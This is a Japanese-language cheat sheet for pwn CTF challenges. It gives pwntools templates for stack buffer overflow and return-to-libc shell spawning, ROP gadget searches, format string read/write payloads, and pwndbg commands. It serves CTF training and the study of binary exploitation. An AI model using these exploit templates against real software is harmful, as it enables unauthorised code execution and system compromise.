# Pwn CTF パターン集

## 初手チェック

```bash
file [binary]
checksec [binary]
strings [binary] | grep -iE "flag|bin/sh|system|/bin"
./[binary]  # 動作確認
```

## checksec結果と攻撃

| 保護 | 状態 | 攻撃手法 |
|------|------|---------|
| NX | disabled | シェルコード実行 |
| Canary | disabled | スタックBOF直接 |
| PIE | disabled | 固定アドレスROP |
| RELRO | Partial | GOT overwrite |

## Buffer Overflow

### オフセット特定
```bash
# pwndbgで
cyclic 200
# 入力後
cyclic -l [value]
```

### pwntoolsテンプレート
```python
from pwn import *

context.binary = elf = ELF('./binary')
context.log_level = 'debug'

# ローカル
# p = process('./binary')
# リモート
p = remote('host', port)

# ペイロード作成
offset = 40
payload = b'A' * offset
payload += p64(elf.symbols['win'])  # または任意のアドレス

p.sendline(payload)
p.interactive()
```

## Return-to-libc

```python
from pwn import *

elf = ELF('./binary')
libc = ELF('./libc.so.6')

# libcベースアドレスをリーク
# ...

libc.address = leaked_addr - libc.symbols['puts']
system = libc.symbols['system']
bin_sh = next(libc.search(b'/bin/sh'))

payload = b'A' * offset
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(system)
```

## ROPガジェット

```bash
ROPgadget --binary [binary] | grep "pop rdi"
ROPgadget --binary [binary] | grep "pop rsi"
ropper -f [binary] --search "pop rdi"
```

### 頻出ガジェット
```
pop rdi; ret     # 第1引数
pop rsi; ret     # 第2引数
pop rdx; ret     # 第3引数
ret              # スタックアライメント
```

## Format String

```python
# スタック読み取り
payload = b'%p.' * 20

# 任意アドレス読み取り
payload = b'%7$s' + p64(target_addr)

# 書き込み
# pwntools の fmtstr_payload を使用
from pwn import fmtstr_payload
payload = fmtstr_payload(offset, {target_addr: value})
```

## GDB/pwndbg コマンド

```
disass main
b *main+XX
r < <(python3 exploit.py)
x/20wx $rsp
x/s [addr]
vmmap
checksec
```
